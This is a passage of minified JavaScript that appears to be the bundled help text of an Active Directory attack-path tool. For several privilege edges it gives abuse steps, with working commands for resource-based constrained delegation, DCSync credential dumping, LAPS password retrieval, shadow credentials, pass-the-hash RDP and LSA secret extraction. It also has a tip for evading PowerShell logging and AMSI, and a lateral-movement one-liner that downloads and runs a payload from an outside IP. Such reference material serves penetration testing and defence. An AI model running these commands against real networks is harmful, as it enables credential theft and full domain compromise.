"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",a,". This can be abused using the lsadump::dcsync command in mimikatz."]});default:return null}},si=({sourceName:n,targetName:r,targetType:a,haslaps:s})=>{switch(a){case"User":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," the ability to change the password of the user ",r,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'})]});case"Computer":return s?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," the ability to obtain the RID 500 administrator password of ",r,". ",n," can do so by listing a computer object's AD properties with PowerView using Get-DomainComputer ",r,". The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on"," ",r,"."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"DCSync"}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",r,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Passwords "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege also grants ",n," enough privileges, to retrieve LAPS passwords domain-wise."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});default:return null}},ii=()=>e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),ci=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),di={general:oi,windowsAbuse:ai,linuxAbuse:si,opsec:ii,references:ci},li=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," is added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:'An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),e.jsx(t,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),hi=({sourceName:n})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"To use this attack, the controlled account MUST have a service principal name set, along with access to either the plaintext or the RC4_HMAC hash of the account."}),e.jsx(t,{variant:"body2",children:"If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:`Rubeus.exe s4u /user:${n}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`})]}),pi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`We can then get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),ui=()=>e.jsx(t,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain."}),mi=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"})]}),bi={general:li,windowsAbuse:hi,linuxAbuse:pi,opsec:ui,references:mi},gi=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",I(r)," ",n," has the constrained delegation privilege to the computer"," ",a,"."]}),e.jsx(t,{variant:"body2",children:'The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.'}),e.jsx(t,{variant:"body2",children:'An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is "HTTP/host.domain.com", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.'})]}),yi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this privilege can utilize Benjamin Delpy's Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse."}),e.jsx(t,{variant:"body2",children:'In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.'}),e.jsx(t,{component:"pre",children:'Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt'})]}),fi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.'}),e.jsx(t,{component:"pre",children:"getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'"})]}),wi=()=>e.jsx(t,{variant:"body2",children:"As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. See the References for more information."}),xi=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/",children:"https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/activedirectory/s4u2pwnage/",children:"https://blog.harmj0y.net/activedirectory/s4u2pwnage/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://twitter.com/gentilkiwi/status/806643377278173185",children:"https://twitter.com/gentilkiwi/status/806643377278173185"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more",children:"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/",children:"https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"})]}),ji={general:gi,windowsAbuse:yi,linuxAbuse:fi,opsec:wi,references:xi},vi=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the capability to create a PSRemote Connection with the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:"PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."}),e.jsx(t,{variant:"body2",children:"Note: This edge does not guarantee privileged execution."})]}),Ai=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abuse of this privilege will require you to have interactive access with a system on the network."}),e.jsx(t,{variant:"body2",children:"A remote session can be opened using the New-PSSession powershell command."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then use the New-PSSession command with the credential we just created:"}),e.jsx(t,{component:"pre",children:`$session = New-PSSession -ComputerName ${a} -Credential $Cred`}),e.jsxs(t,{variant:"body2",children:["This will open a powershell session on ",a,"."]}),e.jsx(t,{variant:"body2",children:"You can then run a command on the system using the Invoke-Command cmdlet and the session you just created"}),e.jsx(t,{component:"pre",children:"Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}"}),e.jsx(t,{variant:"body2",children:"Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands."}),e.jsx(t,{component:"pre",children:`Disconnect-PSSession -Session $session
Remove-PSSession -Session $session`}),e.jsx(t,{variant:"body2",children:"An example of running through this cobalt strike for lateral movement is as follows:"}),e.jsx(t,{component:"pre",children:"powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"})]}),Si=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI."}),e.jsx(t,{variant:"body2",children:"Entering a PSSession will generate a logon event on the target computer."})]}),ki=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7",children:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7",children:"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7"})]}),Ti={general:vi,abuse:Ai,opsec:Si,references:ki},Pi=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the capability to create a Remote Desktop Connection with the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:"Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."}),e.jsx(t,{variant:"body2",children:"Note: This edge does not guarantee privileged execution."})]}),Ci=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abuse of this privilege will depend heavily on the type of access you have."}),e.jsx(t,{variant:"body1",children:"PlainText Credentials with Interactive Access"}),e.jsxs(t,{variant:"body2",children:["With plaintext credentials, the easiest way to exploit this privilege is using the built in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the computer ",a,". When prompted for credentials, input the credentials for"," ",r==="Group"?`a member of ${n}`:`${n}`," to initiate the remote desktop connection."]}),e.jsx(t,{variant:"body1",children:"Password Hash with Interactive Access"}),e.jsx(t,{variant:"body2",children:"With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode."}),e.jsx(t,{variant:"body2",children:"First, inject the NTLM credential for the user you're abusing into memory using mimikatz:"}),e.jsx(t,{component:"pre",children:'lsadump::pth /user:dfm /domain:testlab.local /ntlm:&lt;ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"'}),e.jsxs(t,{variant:"body2",children:["This will open a new RDP window. Input the computer ",a," to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail."]}),e.jsx(t,{variant:"body1",children:"Plaintext Credentials without Interactive Access"}),e.jsx(t,{variant:"body2",children:"This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:"}),e.jsx(t,{component:"pre",children:"(proxychains) xfreerdp /u:dfm /d:testlab.local /v:<computer ip>"}),e.jsx(t,{variant:"body2",children:"xfreerdp will prompt you for a password, and then initiate the remote desktop connection."}),e.jsx(t,{variant:"body1",children:"Password Hash without Interactive Access"}),e.jsx(t,{variant:"body2",children:"This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:"}),e.jsx(t,{component:"pre",children:"(proxychains) xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>"}),e.jsx(t,{variant:"body2",children:"This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled."})]}),Di=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in."}),e.jsx(t,{variant:"body2",children:"Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."})]}),Ri=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/",children:"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/",children:"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/"})]}),Oi={general:Pi,abuse:Ci,opsec:Di,references:Ri},$i=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[I(r)," ",n," contains the ",I(s)," ",a,"."]}),e.jsx(t,{variant:"body2",children:"GPOs linked to a container apply to all objects that are contained by the container."})]}),Ii=()=>e.jsx(t,{variant:"body2",children:"There is no abuse info related to this edge."}),Mi=()=>e.jsx(t,{variant:"body2",children:"There are no opsec considerations related to this edge."}),Gi=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://wald0.com/?p=179",children:"https://wald0.com/?p=179"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.cptjesus.com/posts/bloodhound15",children:"https://blog.cptjesus.com/posts/bloodhound15"})]}),Ei={general:$i,abuse:Ii,opsec:Mi,references:Gi},Fi=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"These two privileges allow a principal to perform a DCSync attack."})]}),Ui=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),_i=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Li=()=>e.jsx(t,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),Wi=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),zi={general:Fi,windowsAbuse:Ui,linuxAbuse:_i,opsec:Li,references:Wi},Bi=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the Standalone Managed Service Account (sMSA) ",a," ","installed on it."]}),e.jsxs(t,{variant:"body2",children:["With administrative privileges on ",n,", it is possible to dump ",a,"'s password stored in LSA secrets."]})]}),Ni=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["From an elevated command prompt on ",n,", run mimikatz then execute the following commands:"]}),e.jsx(t,{component:"pre",children:`privilege::debug
token::elevate
lsadump::secrets`}),e.jsxs(t,{variant:"body2",children:["In the output, find"," ",e.jsxs(t,{component:"pre",children:["_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_",a==null?void 0:a.toLowerCase().split("@")[0]]}),". The next line contains ",e.jsx(t,{component:"pre",children:"cur/hex :"})," followed with ",a,"'s password hex-encoded."]}),e.jsx(t,{variant:"body2",children:"To use this password, its NT hash must be calculated. This can be done using a small python script:"}),e.jsx(t,{component:"pre",children:`# nt.py
import sys, hashlib

pw_hex = sys.argv[1]
nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()

